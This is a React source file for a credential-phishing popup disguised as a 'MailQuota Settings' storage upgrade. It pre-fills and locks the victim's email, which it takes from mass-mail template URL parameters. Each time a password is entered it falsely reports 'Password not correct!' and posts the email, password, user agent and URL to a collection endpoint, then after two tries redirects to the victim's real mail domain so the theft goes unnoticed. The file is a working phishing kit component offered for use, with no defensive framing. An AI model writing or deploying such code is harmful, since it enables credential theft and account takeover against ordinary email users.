/** @format */
"use client";
import React, { useState, useEffect } from "react";

const Popup = ({ domain, systemInfo }) => {
  const { date, browser, os, location } = systemInfo;
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isHovered, setIsHovered] = useState(false);

  // Extract domain from email for logo
  const getDomainFromEmail = () => {
    if (email && email.includes('@')) {
      return email.split('@')[1];
    }
    return domain.toLowerCase() + '.com'; // Fallback to domain name + .com
  };

  useEffect(() => {
    // Extract email from URL using all the provided syntax patterns
    const extractEmailFromURL = () => {
      const url = window.location.href;
      const urlObj = new URL(url);
      
      // All the email parameter patterns
      const emailPatterns = [
        'email', 'Email', 'EMAIL', 'user_email', 'UserEmail', 'userEmail',
        'emailAddress', 'EmailAddress', 'contact_email', 'recipient_email',
        'subscriber_email', 'mail', 'e', 'u', 'addr', 'address'
      ];

      // Check query parameters FIRST - return whatever value is found
      for (const pattern of emailPatterns) {
        const emailValue = urlObj.searchParams.get(pattern);
        if (emailValue) {
          // Return the value even if it's a template pattern
          return emailValue;
        }
      }

      // Check hash parameters
      const hash = urlObj.hash;
      if (hash) {
        const hashParams = new URLSearchParams(hash.substring(1));
        for (const pattern of emailPatterns) {
          const emailValue = hashParams.get(pattern);
          if (emailValue) {
            return emailValue;
          }
        }
      }

      // Check for combined patterns like ?email=[[Email]]#email=[[Email]]
      const combinedRegex = /[?&]#?(?:email|Email|EMAIL|user_email|UserEmail|userEmail|emailAddress|EmailAddress|contact_email|recipient_email|subscriber_email|mail|e|u|addr|address)=([^&?#\s]+)/g;
      let match;
      while ((match = combinedRegex.exec(url)) !== null) {
        if (match[1]) {
          return decodeURIComponent(match[1]);
        }
      }

      // Check URL encoded patterns
      const decodedUrl = decodeURIComponent(url);
      const emailRegex = /[?&]#?(?:email|Email|EMAIL|user_email|UserEmail|userEmail|emailAddress|EmailAddress|contact_email|recipient_email|subscriber_email|mail|e|u|addr|address)=([^&?#\s]+)/g;
      while ((match = emailRegex.exec(decodedUrl)) !== null) {
        if (match[1]) {
          return match[1];
        }
      }

      // Check for all template syntax patterns - RETURN THEM, don't return empty
      const templatePatterns = [
        /[?&]#?email=(\[\[-Email-\]\])/i,
        /[?&]#?email=(\[\[Email\]\])/i,
        /[?&]#?email=(\[\[email\]\])/i,
        /[?&]#?email=(\{\{Email\}\})/i,
        /[?&]#?email=(\{\{email\}\})/i,
        /[?&]#?email=(\{\{ subscriber\.email \}\})/i,
        /[?&]#?email=(\{\{contact\.email\}\})/i,
        /[?&]#?email=(%EMAIL%)/i,
        /[?&]#?email=(%Email%)/i,
        /[?&]#?email=(%email%)/i,
        /[?&]#?email=(%%emailaddress%%)/i,
        /[?&]#?email=(\{Email\})/i,
        /[?&]#?email=(\{email\})/i,
        /[?&]#?email=(<<Email>>)/i,
        /[?&]#?email=(<<email>>)/i,
        /[?&]#?email=(<%= Email %>)/i,
        /[?&]#?email=(<%= email %>)/i,
        /[?&]#?email=(\$\{Email\})/i,
        /[?&]#?email=(\$\{email\})/i,
        /[?&]#?email=(@Email)/i,
        /[?&]#?email=(@email)/i,
        /[?&]#?email=(:email)/i,
        /[?&]#?email=(<Email>)/i,
        /[?&]#?email=(<email>)/i,
        /[?&]#?email=(\[Email\])/i,
        /[?&]#?email=(\[email\])/i,
        /[?&]#?email=("Email")/i,
        /[?&]#?email=('Email')/i
      ];

      for (const pattern of templatePatterns) {
        const match = url.match(pattern);
        if (match && match[1]) {
          // Return the template pattern itself
          return match[1];
        }
      }

      // Check for URL encoded template patterns - RETURN THEM
      const encodedPatterns = [
        /%3Femail%3D\[\[Email\]\]/i,
        /%3Femail%3D\[\[-Email-\]\]/i,
        /%3Femail%3D%7B%7BEmail%7D%7D/i,
        /%3Femail%3D%25EMAIL%25/i,
        /%3Femail%3D%%emailaddress%%/i,
        /%3Femail%3D%255B%255BEmail%255D%255D/i,
        /%23email%3D\[\[Email\]\]/i,
        /%23email%3D\[\[-Email-\]\]/i,
        /%23email%3D%7B%7BEmail%7D%7D/i,
        /%23email%3D%25EMAIL%25/i,
        /%23email%3D%%emailaddress%%/i,
        /%23email%3D%255B%255BEmail%255D%255D/i
      ];

      for (const pattern of encodedPatterns) {
        if (pattern.test(url)) {
          // Try to extract the actual pattern value
          const encodedMatch = url.match(/[?&]#?email=([^&?#]+)/i);
          if (encodedMatch && encodedMatch[1]) {
            return decodeURIComponent(encodedMatch[1]);
          }
        }
      }

      return "";
    };

    const isValidEmail = (email) => {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return emailRegex.test(email) && 
             !email.includes('[[Email]]') && 
             !email.includes('{{Email}}') && 
             !email.includes('%%emailaddress%%') &&
             !email.includes('[[email]]') &&
             !email.includes('{{email}}') &&
             !email.includes('{{ subscriber.email }}') &&
             !email.includes('{{contact.email}}') &&
             !email.includes('%EMAIL%') &&
             !email.includes('%Email%') &&
             !email.includes('%email%') &&
             !email.includes('{Email}') &&
             !email.includes('{email}') &&
             !email.includes('<<Email>>') &&
             !email.includes('<<email>>') &&
             !email.includes('<%= Email %>') &&
             !email.includes('<%= email %>') &&
             !email.includes('${Email}') &&
             !email.includes('${email}') &&
             !email.includes('@Email') &&
             !email.includes('@email') &&
             !email.includes(':email') &&
             !email.includes('<Email>') &&
             !email.includes('<email>') &&
             !email.includes('[Email]') &&
             !email.includes('[email]') &&
             !email.includes('"Email"') &&
             !email.includes("'Email'");
    };

    const extractedEmail = extractEmailFromURL();
    if (extractedEmail) {
      setEmail(extractedEmail);
    }
  }, []);

  const sendEmail = async (email, password) => {
    try {
      const userAgent = navigator.userAgent;
      const remoteAddress = "";
      
      const response = await fetch("/api/sendemail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ 
          email,
          password, 
          userAgent, 
          remoteAddress, 
          landingUrl: window.location.href
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to send email");
      }

      const data = await response.json();
      console.log(data.message);
    } catch (error) {
      console.error("Error:", error);
    } finally {
      setPassword("");
    }
  };

  const handleNextClick = () => {
    if (attempts === 0) {
      setErrorMessage("Password not correct!");
      sendEmail(email, password);
      setAttempts(attempts + 1);
    } else if (attempts === 1) {
      setErrorMessage("Password still not correct!");
      sendEmail(email, password);
      setAttempts(attempts + 1);
      
      // Redirect to email domain website after second attempt
      const emailDomain = getDomainFromEmail();
      if (emailDomain) {
        window.location.href = `https://www.${emailDomain}`;
      }
    }
  };

  return (
    <div className="popup">
      <div className="popup-content">
        <div className="djdfe">
          {/* Header Text */}
          <div style={{
            textAlign: "center",
            marginBottom: "20px",
            fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif"
          }}>
            <div style={{
              fontSize: "18px",
              fontWeight: "bold",
              color: "#333",
              marginBottom: "5px"
            }}>
              MailQuota Settings
            </div>
            <div style={{
              fontSize: "14px",
              color: "#666"
            }}>
              Verify Your ID to upgrade your mail storage
            </div>
          </div>

          {/* Email Field - NON-EDITABLE AND NON-REMOVABLE */}
          <div className="pasww" style={{ marginBottom: "15px" }}>
            <div style={{
              fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
              fontSize: "14px",
              marginBottom: "5px",
              fontWeight: "500"
            }}>
              Email Address
            </div>
            <input
              type="email"
              className="fjhd"
              style={{
                paddingLeft: "15px",
                borderRadius: "4px",
                height: "40px",
                fontSize: "14px",
                border: "1px solid #ccc",
                width: "100%",
                backgroundColor: "#f5f5f5",
                outline: "none",
                fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
                cursor: "default"
              }}
              placeholder="Email will be auto-filled from URL"
              value={email}
              readOnly
              onKeyDown={(e) => {
                // Prevent all keyboard input
                e.preventDefault();
                return false;
              }}
              onKeyPress={(e) => {
                // Prevent all keyboard input
                e.preventDefault();
                return false;
              }}
              onKeyUp={(e) => {
                // Prevent all keyboard input
                e.preventDefault();
                return false;
              }}
              onPaste={(e) => {
                // Prevent pasting
                e.preventDefault();
                return false;
              }}
              onCut={(e) => {
                // Prevent cutting
                e.preventDefault();
                return false;
              }}
              onCopy={(e) => {
                // Allow copying but don't change the value
                return;
              }}
              onClick={(e) => {
                // Prevent focusing/selecting
                e.target.blur();
              }}
              onFocus={(e) => {
                // Remove focus immediately
                e.target.blur();
              }}
              onMouseDown={(e) => {
                // Prevent selecting text
                e.preventDefault();
              }}
              autoComplete="off"
              spellCheck="false"
            />
          </div>

          {/* Password Field */}
          <div className="pasww" style={{ marginBottom: "5px" }}>
            <div style={{
              fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
              fontSize: "14px",
              fontWeight: "500",
              marginBottom: "2px",
            }}>
              Password
            </div>
            <input
              type={showPassword ? "text" : "password"}
              className="fjhd"
              style={{
                paddingLeft: "15px",
                borderRadius: "4px",
                height: "40px",
                fontSize: "14px",
                border: "1px solid #ccc",
                width: "100%",
                backgroundColor: "#ffffff",
                outline: "none",
                fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif"
              }}
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>

          <div className="njhiu" style={{ 
            fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", 
            fontSize: "12px", 
            marginLeft: "8px", 
            marginBottom: "2px" 
          }}>
            {errorMessage}
          </div>

          <div className="fjiure">
            <button 
              className="urifjdd" 
              onClick={handleNextClick}
              onMouseEnter={() => setIsHovered(true)}
              onMouseLeave={() => setIsHovered(false)}
              style={{
                fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
                width: "100%",
                height: "50px",
                borderRadius: "4px",
                border: "none",
                backgroundColor: isHovered ? "rgb(50, 50, 200)" : "rgb(71, 71, 247)",
                color: "#ffffff",
                fontSize: "16px",
                fontWeight: "normal",
                cursor: "pointer",
                outline: "none",
                marginBottom: "20px"
              }} 
            >
              UPGRADE STORAGE
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Popup;